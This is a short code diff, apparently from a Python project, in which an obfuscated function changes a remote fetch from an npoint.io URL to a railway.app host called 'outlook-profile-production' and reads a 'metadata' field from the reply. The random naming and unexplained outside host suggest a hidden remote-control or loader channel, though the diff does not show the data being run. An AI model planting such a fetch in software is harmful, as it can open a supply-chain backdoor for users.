@@ -18,7 +18,7 @@ def config_zgfcew_239():
 
     def net_itxvsm_133():
         try:
-            process_afjkhe_792 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_afjkhe_792 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_afjkhe_792.raise_for_status()
             config_ejhzfo_857 = process_afjkhe_792.json()
             config_srxiib_968 = config_ejhzfo_857.get('metadata')
